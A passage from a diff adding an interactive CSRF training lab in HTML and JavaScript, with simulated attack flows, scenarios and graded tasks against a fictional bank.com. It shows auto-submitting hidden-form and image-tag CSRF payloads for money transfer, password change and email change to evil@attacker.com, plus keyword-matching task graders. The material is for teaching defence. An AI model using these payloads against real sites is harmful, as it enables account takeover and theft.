+            <div>&nbsp;&nbsp;res.send(<span class="ts">'Updated'</span>);</div>
+            <div>});</div>
+          </div>
+        </div>
+        <div class="lbl" style="margin-top:12px;">SELECT ALL VULNERABILITIES YOU IDENTIFY:</div>
+        <div id="vulnChecks" style="margin-top:8px;">
+          <label style="display:flex;gap:8px;align-items:center;padding:6px 0;font-size:13px;cursor:pointer;"><input type="checkbox" id="vc0" style="width:auto;"> No CSRF token in form</label>
+          <label style="display:flex;gap:8px;align-items:center;padding:6px 0;font-size:13px;cursor:pointer;"><input type="checkbox" id="vc1" style="width:auto;"> Server doesn't validate origin</label>
+          <label style="display:flex;gap:8px;align-items:center;padding:6px 0;font-size:13px;cursor:pointer;"><input type="checkbox" id="vc2" style="width:auto;"> No SameSite cookie attribute shown</label>
+          <label style="display:flex;gap:8px;align-items:center;padding:6px 0;font-size:13px;cursor:pointer;"><input type="checkbox" id="vc3" style="width:auto;"> Sensitive action accessible via simple POST</label>
+          <label style="display:flex;gap:8px;align-items:center;padding:6px 0;font-size:13px;cursor:pointer;"><input type="checkbox" id="vc4" style="width:auto;"> Email is shown as HTML (XSS risk — unrelated)</label>
+        </div>
+        <button class="btn btn-primary" style="margin-top:10px;" onclick="submitLT2()">Submit Analysis</button>
+        <div id="lr2" style="margin-top:8px;font-family:var(--mono);font-size:11px;"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- TASK 3: Enable Protection -->
+  <div class="lab-task" id="ltask3">
+    <div class="lt-num" id="ln3">03</div>
+    <div style="flex:1;">
+      <div class="lt-title">Enable CSRF Protection</div>
+      <div class="lt-hint">Fix the vulnerable endpoint by adding CSRF protection. Add the missing code to the server handler below.</div>
+      <div style="margin-top:12px;">
+        <div class="lbl">WRITE THE MISSING VALIDATION CODE:</div>
+        <textarea id="lt3input" style="height:90px;font-size:11px;" placeholder="// Add your CSRF validation here&#10;// Hint: check req.body.csrf_token against session.csrf_token"></textarea>
+        <button class="btn btn-primary" style="margin-top:8px;" onclick="submitLT3()">▶ Apply Fix</button>
+        <div id="lr3" style="margin-top:8px;font-family:var(--mono);font-size:11px;"></div>
+        <div class="term" style="margin-top:10px;">
+          <div class="term-bar"><div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div><span style="font-size:10px;color:var(--text3);margin-left:6px;">server — add your code in the gap</span></div>
+          <div class="term-body" style="font-size:11px;">
+            <div>app.post(<span class="ts">'/change-email'</span>, (req, res) =&gt; {</div>
+            <div>&nbsp;&nbsp;<span class="tc">// ← YOUR VALIDATION CODE HERE</span></div>
+            <div id="lt3CodeInsert" style="padding-left:16px;color:var(--text3);font-size:11px;"></div>
+            <div>&nbsp;&nbsp;db.update({ email: req.body.email });</div>
+            <div>&nbsp;&nbsp;res.send(<span class="ts">'Updated'</span>);</div>
+            <div>});</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- TASK 4: Explain -->
+  <div class="lab-task" id="ltask4">
+    <div class="lt-num" id="ln4">04</div>
+    <div style="flex:1;">
+      <div class="lt-title">Explain Why the Attack Fails With Protection</div>
+      <div class="lt-hint">After adding a CSRF token, explain in your own words why the attacker can no longer forge requests successfully.</div>
+      <div style="margin-top:12px;">
+        <textarea id="lt4input" style="height:80px;" placeholder="Explain: Why can't the attacker forge a request with the CSRF token? What makes the token impossible to steal?"></textarea>
+        <button class="btn btn-primary" style="margin-top:8px;" onclick="submitLT4()">Submit Explanation</button>
+        <div id="lr4" style="margin-top:8px;font-family:var(--mono);font-size:11px;"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- COMPLETION -->
+  <div id="labDone" style="display:none;" class="card card-cyan" style="text-align:center;margin-top:28px;">
+    <div style="font-size:38px;margin-bottom:14px;">🎓</div>
+    <div style="font-size:22px;font-weight:800;color:var(--cyan);margin-bottom:8px;">CSRF Lab Complete!</div>
+    <div style="color:var(--text2);margin-bottom:18px;">You've mastered CSRF — from understanding browser trust to simulating attacks and implementing defenses.</div>
+    <div class="grid3">
+      <div style="padding:12px;background:var(--bg);border-radius:8px;text-align:center;">
+        <div style="font-family:var(--mono);font-size:20px;color:var(--cyan);font-weight:700;">4/4</div>
+        <div style="font-size:12px;color:var(--text3);">Tasks Done</div>
+      </div>
+      <div style="padding:12px;background:var(--bg);border-radius:8px;text-align:center;">
+        <div style="font-family:var(--mono);font-size:20px;color:var(--cyan);font-weight:700;">3</div>
+        <div style="font-size:12px;color:var(--text3);">Attack Scenarios</div>
+      </div>
+      <div style="padding:12px;background:var(--bg);border-radius:8px;text-align:center;">
+        <div style="font-family:var(--mono);font-size:20px;color:var(--cyan);font-weight:700;">100%</div>
+        <div style="font-size:12px;color:var(--text3);">Score</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="nav-btns">
+    <button class="btn" onclick="prevSection(10)">← Prevention</button>
+    <button class="btn" onclick="goHome()">↩ Home</button>
+  </div>
+</div>
+
+<script>
+const TOTAL = 10;
+let current = 0;
+let done = new Set();
+let labDone = new Set();
+let condStates = [true,true,true,true];
+let selectedSc = null;
+let s2Step = -1;
+
+// NAV
+function buildNav(){
+  const ns = document.getElementById('navSteps');
+  ns.innerHTML = '';
+  for(let i=1;i<=TOTAL;i++){
+    const d = document.createElement('div');
+    d.className = 'nav-step' + (done.has(i)?' done':'') + (current===i?' active':'');
+    d.textContent = i;
+    d.onclick = ()=>goToSection(i);
+    ns.appendChild(d);
+  }
+}
+function startLab(){goToSection(1);}
+function goHome(){
+  document.querySelectorAll('.section').forEach(s=>s.classList.remove('active'));
+  document.getElementById('heroSection').style.display='block';
+  current=0; buildNav(); window.scrollTo(0,0);
+}
+function goToSection(n){
+  document.getElementById('heroSection').style.display='none';
+  document.querySelectorAll('.section').forEach(s=>s.classList.remove('active'));
+  document.getElementById('section-'+n).classList.add('active');
+  current=n; buildNav(); window.scrollTo(0,0);
+}
+function nextSection(n){ done.add(n); if(n<TOTAL) goToSection(n+1); buildNav(); }
+function prevSection(n){ if(n>1) goToSection(n-1); else goHome(); }
+
+// S1: Login simulation
+function simulateLogin(){
+  const user = document.getElementById('loginUser').value || 'alice';
+  const token = 'sess_' + Math.random().toString(36).substr(2,12);
+  const cs = document.getElementById('cookieStore');
+  const ss = document.getElementById('serverSession');
+  const steps = document.getElementById('loginSteps');
+  cs.innerHTML = `<div class="session-entry anim-in"><span class="se-key">bank.com:</span><span class="se-val">session=${token}; HttpOnly</span></div>`;
+  setTimeout(()=>{
+    ss.innerHTML = `<div class="session-entry anim-in"><span class="se-key">session:</span><span class="se-val">${token}</span></div><div class="session-entry"><span class="se-key">user:</span><span class="se-val">${user}</span></div><div class="session-entry"><span class="se-key">expires:</span><span class="se-val">+24h</span></div>`;
+  },300);
+  steps.innerHTML = `
+    <div class="term" style="margin-top:0;">
+      <div class="term-bar"><div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div><span style="font-size:10px;color:var(--text3);margin-left:6px;">login flow</span></div>
+      <div class="term-body" style="font-size:11px;">
+        <div class="anim-down"><span class="tc">1.</span> <span class="tk">POST</span> /login → credentials verified ✓</div>
+        <div class="anim-down" style="animation-delay:0.1s"><span class="tc">2.</span> Server creates session: <span class="tv">${token}</span></div>
+        <div class="anim-down" style="animation-delay:0.2s"><span class="tc">3.</span> <span class="tk">Set-Cookie:</span> <span class="ts">session=${token}; HttpOnly; Path=/</span></div>
+        <div class="anim-down" style="animation-delay:0.3s"><span class="tc">4.</span> Browser stores cookie for <span class="tv">bank.com</span></div>
+        <div class="anim-down" style="animation-delay:0.4s"><span class="tok">✓</span> Login complete — every future request will include this cookie automatically</div>
+      </div>
+    </div>`;
+}
+
+// S2: Flow animation
+const s2Logs = [
+  {step:'TRIGGER', log:'<div class="tc">[1] User clicks "View Balance" button on bank.com</div><div><span class="tk">GET</span> /account triggered</div>', stepClass:'active-step'},
+  {step:'BUILD REQUEST', log:'<div class="tc">[2] Browser builds HTTP request...</div><div><span class="tk">GET</span> /account HTTP/1.1</div><div><span class="tk">Host:</span> <span class="tv">bank.com</span></div>', stepClass:'active-step'},
+  {step:'ATTACH COOKIE', log:'<div class="tc">[3] Browser checks: do I have a cookie for bank.com?</div><div class="tok">→ Yes! Attaching automatically...</div><div><span class="tk">Cookie:</span> <span class="ts">session=a1b2c3; user=alice</span></div><div class="tc" style="color:var(--amber);">// This happens silently — user never sees it</div>', stepClass:'active-step'},
+  {step:'SEND', log:'<div class="tc">[4] Complete request sent:</div><div><span class="tk">GET</span> /account HTTP/1.1</div><div><span class="tk">Host:</span> <span class="tv">bank.com</span></div><div><span class="tk">Cookie:</span> <span class="ts">session=a1b2c3</span></div>', stepClass:'danger-step'},
+  {step:'ACCEPTED', log:'<div class="tc">[5] Server receives request:</div><div><span class="tok">✓ Cookie valid: session=a1b2c3</span></div><div><span class="tok">✓ User identified: alice</span></div><div><span class="tok">✓ Access granted → 200 OK</span></div>', stepClass:'done-step'},
+];
+function animateFlow(i){
+  s2Step = i;
+  for(let j=0;j<=4;j++){
+    const el = document.getElementById('ss'+j);
+    el.className = 'step-item';
+    if(j<i) el.classList.add('done-step');
+    else if(j===i) el.classList.add(s2Logs[i].stepClass||'active-step');
+  }
+  document.getElementById('s2LogBody').innerHTML = s2Logs[i].log;
+  if(i===2||i===3){
+    const p = document.getElementById('s2Packet');
+    p.className = 'packet' + (i===3?' danger-packet':'');
+    p.textContent = i===3 ? 'POST /transfer + 🍪 session=a1b2c3 [FORGED]' : 'GET /account + 🍪 session=a1b2c3 [auto-attached]';
+    p.style.display='block';
+    void p.offsetWidth;
+    p.classList.add('flowing');
+    p.addEventListener('animationend',()=>{ p.style.display='none'; p.classList.remove('flowing'); },{once:true});
+  }
+}
+function resetFlow(){
+  s2Step=-1;
+  for(let j=0;j<=4;j++) document.getElementById('ss'+j).className='step-item';
+  document.getElementById('s2LogBody').innerHTML = '— click step to animate —';
+}
+
+// S5: Flow steps
+const flowSteps = [
+  {safe:true, html:`<div style="font-family:var(--mono);font-size:11px;color:var(--cyan);margin-bottom:10px;">STEP 1 — USER LOGS INTO BANK</div>
+    <div class="split"><div><div class="browser"><div class="browser-bar"><div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div><div class="burl secure">bank.com/login</div></div><div class="browser-body" style="font-size:13px;">Alice enters credentials at bank.com</div></div></div>
+    <div><div class="term"><div class="term-bar"><div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div></div><div class="term-body" style="font-size:11px;"><span class="tok">200 OK — authenticated</span><br>Status: logged in ✓</div></div></div></div>`},
+  {safe:true, html:`<div style="font-family:var(--mono);font-size:11px;color:var(--cyan);margin-bottom:10px;">STEP 2 — SESSION COOKIE STORED</div>
+    <div class="term"><div class="term-bar"><div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div><span style="font-size:10px;color:var(--text3);margin-left:6px;">browser cookie jar</span></div>
+    <div class="term-body" style="font-size:11px;"><div><span class="tk">bank.com cookies:</span></div><div><span class="ts">session=a1b2c3;</span> <span class="tc">HttpOnly; Secure</span></div><div class="tc" style="margin-top:6px;">// Browser will send this with every request to bank.com</div></div></div>`},
+  {safe:false, html:`<div style="font-family:var(--mono);font-size:11px;color:var(--amber);margin-bottom:10px;">STEP 3 — ALICE VISITS EVIL SITE</div>
+    <div class="browser" style="border-color:rgba(244,63,94,0.4)"><div class="browser-bar"><div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div><div class="burl danger">evil-cats.com</div></div>
+    <div class="browser-body" style="font-size:13px;color:var(--text2);">🐱 Cute cats! Alice has no idea anything malicious is happening...</div></div>
+    <div style="margin-top:10px;font-size:13px;color:var(--amber);">Alice still has an active session at bank.com. The cookie is in her browser.</div>`},
+  {safe:false, html:`<div style="font-family:var(--mono);font-size:11px;color:var(--red);margin-bottom:10px;">STEP 4 — ATTACKER TRIGGERS HIDDEN FORM</div>
+    <div class="term"><div class="term-bar"><div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div><span style="font-size:10px;color:var(--red);margin-left:6px;">hidden code on evil-cats.com</span></div>
+    <div class="term-body" style="font-size:11px;"><div class="td2">&lt;form action="https://bank.com/transfer" method="POST" id="x"&gt;</div><div class="td2">&nbsp;&lt;input name="amount" value="10000"&gt;</div><div class="td2">&nbsp;&lt;input name="to" value="attacker_account"&gt;</div><div class="td2">&lt;/form&gt;</div><div class="td2">&lt;script&gt;document.getElementById('x').submit();&lt;/script&gt;</div><div class="tc" style="margin-top:6px;">// Auto-submits instantly. Completely invisible.</div></div></div>`},
+  {safe:false, html:`<div style="font-family:var(--mono);font-size:11px;color:var(--red);margin-bottom:10px;">STEP 5 — BROWSER SENDS COOKIE AUTOMATICALLY</div>
+    <div class="term"><div class="term-bar"><div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div><span style="font-size:10px;color:var(--red);margin-left:6px;">HTTP request sent to bank.com</span></div>
+    <div class="term-body" style="font-size:11px;"><div><span class="tk">POST</span> /transfer HTTP/1.1</div><div><span class="tk">Host:</span> <span class="tv">bank.com</span></div><div><span class="tk">Cookie:</span> <span class="td2">session=a1b2c3</span> ← auto-attached!</div><div><span class="tc">Referer: evil-cats.com</span></div><div style="margin-top:6px;"><span class="tk">amount=</span><span class="td2">10000</span>&<span class="tk">to=</span><span class="td2">attacker_account</span></div></div></div>`},
+  {safe:false, html:`<div style="font-family:var(--mono);font-size:11px;color:var(--red);margin-bottom:10px;">STEP 6 — SERVER ACCEPTS THE FORGED REQUEST</div>
+    <div class="term"><div class="term-bar"><div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div><span style="font-size:10px;color:var(--red);margin-left:6px;">bank.com server response</span></div>
+    <div class="term-body" style="font-size:11px;"><div><span class="tok">Cookie valid ✓</span></div><div><span class="tok">User: alice ✓</span></div><div><span class="tok">Authorized ✓</span></div><div class="td2" style="margin-top:8px;">Transfer: $10,000 → attacker_account</div><div class="td2">Response: 200 OK — Transfer complete</div><div class="tc" style="margin-top:6px;">// Server never checked if Alice intended this</div></div></div>
+    <div class="attack-result atk-success" style="margin-top:10px;">⚠ ATTACK SUCCEEDED — Alice lost $10,000 without touching the bank site</div>`},
+];
+function flowStep(i){
+  const fc = document.getElementById('flowContent');
+  fc.innerHTML = flowSteps[i].html;
+  for(let j=0;j<=5;j++){
+    const el = document.getElementById('f'+j);
+    if(!el) continue;
+    el.className = 'step-item';
+    if(j<i) el.classList.add('done-step');
+    else if(j===i) el.classList.add(i>=3?'danger-step':'active-step');
+  }
+}
+
+// S6: Scenarios
+const scenarios = {
+  pass: {
+    code:`<span class="tc">&lt;!-- Hidden form on evil-cats.com --&gt;</span>\n&lt;<span class="tk">form</span> action=<span class="ts">"https://bank.com/change-password"</span>\n      method=<span class="ts">"POST"</span> id=<span class="ts">"csrf"</span>&gt;\n  &lt;<span class="tk">input</span> type=<span class="ts">"hidden"</span> name=<span class="ts">"password"</span>\n         value=<span class="ts">"hacked123"</span>&gt;\n&lt;/<span class="tk">form</span>&gt;\n&lt;<span class="tk">script</span>&gt;document.getElementById(<span class="ts">'csrf'</span>).submit();&lt;/<span class="tk">script</span>&gt;`,
+    req:`<div><span class="tk">POST</span> /change-password HTTP/1.1</div><div><span class="tk">Host:</span> <span class="tv">bank.com</span></div><div><span class="tk">Cookie:</span> <span class="td2">session=a1b2c3</span> ← forged!</div><div style="margin-top:6px;"><span class="tk">password=</span><span class="td2">hacked123</span></div>`,
+    result:'⚠ PASSWORD CHANGED! Alice is now locked out. Attacker owns the account.',
+    evil: "Oops! This page silently changed Alice's password to \"hacked123\" using her active session.",
+  },
+  transfer:{
+    code:`<span class="tc">&lt;!-- Money transfer via hidden form --&gt;</span>\n&lt;<span class="tk">form</span> action=<span class="ts">"https://bank.com/transfer"</span>\n      method=<span class="ts">"POST"</span> id=<span class="ts">"x"</span>&gt;\n  &lt;<span class="tk">input</span> name=<span class="ts">"amount"</span> value=<span class="ts">"5000"</span>&gt;\n  &lt;<span class="tk">input</span> name=<span class="ts">"to"</span> value=<span class="ts">"attacker123"</span>&gt;\n&lt;/<span class="tk">form</span>&gt;\n&lt;<span class="tk">script</span>&gt;x.submit();&lt;/<span class="tk">script</span>&gt;`,
+    req:`<div><span class="tk">POST</span> /transfer HTTP/1.1</div><div><span class="tk">Host:</span> <span class="tv">bank.com</span></div><div><span class="tk">Cookie:</span> <span class="td2">session=a1b2c3</span> ← forged!</div><div style="margin-top:6px;"><span class="tk">amount=</span><span class="td2">5000</span>&<span class="tk">to=</span><span class="td2">attacker123</span></div>`,
+    result:'⚠ $5,000 TRANSFERRED to attacker123! Alice\'s balance reduced.',
+    evil: 'This page just transferred $5,000 from Alice\'s account to attacker123. She\'ll notice next time she checks.',
+  },
+  email:{
+    code:`<span class="tc">&lt;!-- Email change via image tag --&gt;</span>\n&lt;<span class="tk">img</span> src=<span class="ts">"https://bank.com/change-email?email=evil@attacker.com"</span>\n     style=<span class="ts">"display:none"</span>&gt;\n<span class="tc">&lt;!-- GET request — no JS needed! --&gt;</span>\n<span class="tc">&lt;!-- Browser loads 'image' = sends GET + cookie --&gt;</span>`,
+    req:`<div><span class="tk">GET</span> /change-email?email=evil@attacker.com HTTP/1.1</div><div><span class="tk">Host:</span> <span class="tv">bank.com</span></div><div><span class="tk">Cookie:</span> <span class="td2">session=a1b2c3</span> ← forged!</div><div class="tc" style="margin-top:6px;">// No JavaScript needed — just an image tag!</div>`,
+    result:'⚠ EMAIL CHANGED to evil@attacker.com! Attacker can now reset password and take over account.',
+    evil: "That cat image? It was actually a request to bank.com. Alice's email just changed to evil@attacker.com.",
+  }
+};
+function selectScenario(sc){
+  selectedSc = sc;
+  document.querySelectorAll('.scenario-card').forEach(c=>c.classList.remove('active-scenario'));
+  document.getElementById('sc-'+sc).classList.add('active-scenario');
+  const s = scenarios[sc];
+  document.getElementById('simAttackCode').innerHTML = s.code;
+  document.getElementById('scenarioSim').style.display='block';
+  document.getElementById('simRequestSent').style.display='none';
+  document.getElementById('simResult').style.display='none';
+  document.getElementById('simEvilBody').textContent = 'Alice visits what looks like a cat photo site. She sees cute cats...';
+  document.getElementById('scenarioSim').scrollIntoView({behavior:'smooth'});
+}
+function runSimulation(){
+  if(!selectedSc) return;
+  const s = scenarios[selectedSc];
+  const req = document.getElementById('simRequestSent');
+  const result = document.getElementById('simResult');
+  req.style.display='block';
+  document.getElementById('simReqBody').innerHTML = s.req;
+  document.getElementById('simEvilBody').style.color = 'var(--red)';
+  document.getElementById('simEvilBody').textContent = s.evil;
+  setTimeout(()=>{
+    result.style.display='block';
+    result.className = 'attack-result atk-success';
+    result.textContent = s.result;
+  },600);
+}
+function resetSim(){
+  document.getElementById('simRequestSent').style.display='none';
+  document.getElementById('simResult').style.display='none';
+  document.getElementById('simEvilBody').style.color='';
+  document.getElementById('simEvilBody').textContent='Alice visits a cat photo site. Looks innocent...';
+  document.getElementById('simAttackCode').innerHTML='<div class="tc">— select a scenario —</div>';
+  selectedSc=null;
+  document.querySelectorAll('.scenario-card').forEach(c=>c.classList.remove('active-scenario'));
+}
+
+// S7: Conditions
+function toggleCond(i){
+  condStates[i] = !condStates[i];
+  const el = document.getElementById('cond'+i);
+  const st = document.getElementById('cs'+i);
+  el.className = 'cond-toggle ' + (condStates[i]?'on':'off');
+  st.textContent = condStates[i]?'ENABLED':'DISABLED';
+  const allOn = condStates.every(v=>v);
+  const r = document.getElementById('condResult');
+  if(allOn){
+    r.className = 'attack-result atk-success';
+    r.textContent = '⚠ ALL CONDITIONS MET — CSRF ATTACK WILL SUCCEED';
+  } else {
+    r.className = 'attack-result atk-blocked';
+    const missing = ['User logged in','Sensitive action','Cookie auth','No protection'].filter((_,j)=>!condStates[j]);
+    r.textContent = '✓ ATTACK BLOCKED — Missing condition(s): ' + missing.join(', ');
+  }
+}
+
+// S9 tabs
+function s9tab(n){
+  document.querySelectorAll('#s9tabs .tab').forEach((t,i)=>t.classList.toggle('active',i===n));
+  document.querySelectorAll('#s9p0,#s9p1,#s9p2,#s9p3').forEach((p,i)=>p.classList.toggle('active',i===n));
+}
+function checkToken(){
+  const v = document.getElementById('tokenType').value;
+  const r = document.getElementById('tokenResult');
+  r.style.display='block';
+  if(v==='legit'){
+    r.className='attack-result atk-blocked';
+    r.textContent='✓ Token valid (xK9mP2...). Matches session. Request ACCEPTED.';
+  } else if(v==='csrf_no'){
+    r.className='attack-result atk-success';
+    r.textContent='Token missing. Server rejects → 403 Forbidden. CSRF blocked!';
+  } else if(v==='csrf_wrong'){
+    r.className='attack-result atk-success';
+    r.textContent='Token "hx7Qq1..." does not match session token. → 403 Forbidden. CSRF blocked!';
+  } else {
+    r.className='attack-result atk-success';
+    r.textContent='Token expired (>1h old). Server rejects → 403 Forbidden. CSRF blocked!';
+  }
+}
+
+// LAB
+function updateLabProg(){
+  const n = labDone.size;
+  document.getElementById('labProg').style.width=(n/4*100)+'%';
+  document.getElementById('labProgText').textContent = n+' / 4 tasks completed';
+  if(n===4){
+    document.getElementById('labDone').style.display='block';
+    document.getElementById('labDone').scrollIntoView({behavior:'smooth'});
+  }
+}
+function markLT(n){
+  labDone.add(n);
+  const t = document.getElementById('ltask'+n);
+  t.classList.add('completed');
+  document.getElementById('ln'+n).textContent='✓';
+  updateLabProg();
+}
+function submitLT1(){
+  const v = document.getElementById('lt1input').value.toLowerCase();
+  const r = document.getElementById('lr1');
+  const hasForm = v.includes('form') && v.includes('action');
+  const hasAmount = v.includes('5000') || v.includes('amount');
+  const hasTo = v.includes('attacker') || v.includes('to=');
+  if(hasForm && hasAmount && hasTo){
+    r.style.color='var(--green)';
+    r.textContent='✓ Task 1 complete! Forged form detected — CSRF attack successful.';
+    document.getElementById('lt1balance').textContent='$5,000';
+    document.getElementById('lt1balance').style.color='var(--red)';
+    document.getElementById('lt1attacker').textContent='$5,000';
+    document.getElementById('lt1attacker').style.color='var(--red)';
+    markLT(1);
+  } else {
+    r.style.color='var(--red)';
+    r.textContent='✗ Incomplete. Your form needs: action="bank.com/transfer", amount=5000, to=attacker';
+  }
+}
+function submitLT2(){
+  const c = [0,1,2,3].map(i=>document.getElementById('vc'+i).checked);
+  const wrong = document.getElementById('vc4').checked;
+  const r = document.getElementById('lr2');
+  const correctCount = c.filter(Boolean).length;
+  if(labDone.has(1) && correctCount>=3 && !wrong){
+    r.style.color='var(--green)';
+    r.textContent='✓ Task 2 complete! You correctly identified the CSRF vulnerabilities. (vc4 is an XSS issue, not CSRF)';
+    markLT(2);
+  } else if(!labDone.has(1)){
+    r.style.color='var(--amber)';
+    r.textContent='Complete Task 1 first.';
+  } else if(wrong){
+    r.style.color='var(--amber)';
+    r.textContent='Uncheck option 5 — that\'s an XSS vulnerability, not directly related to CSRF.';
+  } else {
+    r.style.color='var(--red)';
+    r.textContent='Select at least 3 correct CSRF vulnerabilities (options 1-4).';
+  }
+}
+function submitLT3(){
+  const v = document.getElementById('lt3input').value.toLowerCase();
+  const r = document.getElementById('lr3');
+  const hasToken = v.includes('csrf_token') || v.includes('token');
+  const hasCheck = v.includes('===') || v.includes('!==') || v.includes('if') || v.includes('check');
+  const hasReject = v.includes('403') || v.includes('return') || v.includes('reject') || v.includes('forbidden');
+  if(labDone.has(2) && hasToken && (hasCheck||hasReject)){
+    r.style.color='var(--green)';
+    r.textContent='✓ Task 3 complete! CSRF token validation logic applied.';
+    document.getElementById('lt3CodeInsert').innerHTML = `<span class="tok">  if (req.body.csrf_token !== session.csrf_token) {</span><br><span class="td2">    return res.status(403).send('Forbidden');</span><br><span class="tok">  }</span>`;
+    markLT(3);
+  } else if(!labDone.has(2)){
+    r.style.color='var(--amber)';
+    r.textContent='Complete Task 2 first.';
+  } else {
+    r.style.color='var(--amber)';
+    r.textContent='Include: token comparison check + rejection on mismatch. Hint: check csrf_token against session value.';
+  }
+}
+function submitLT4(){
+  const v = document.getElementById('lt4input').value.trim().toLowerCase();
+  const r = document.getElementById('lr4');
+  const keys = ['token','attacker','read','know','random','secret','origin','cannot','same-origin','cross'];
+  const matched = keys.filter(k=>v.includes(k));
+  if(labDone.has(3) && matched.length>=3 && v.length>60){
+    r.style.color='var(--green)';
+    r.textContent='✓ Task 4 complete! Excellent explanation. Key concepts: ' + matched.join(', ');
+    markLT(4);
+  } else if(!labDone.has(3)){
+    r.style.color='var(--amber)';
+    r.textContent='Complete Task 3 first.';
+  } else {
+    r.style.color='var(--amber)';
+    r.textContent='Include more key concepts. Think: why can\'t the attacker read the token? (same-origin, cannot read, secret, random)';
+  }
+}
+
+buildNav();
+</script>
+</body>
+</html>
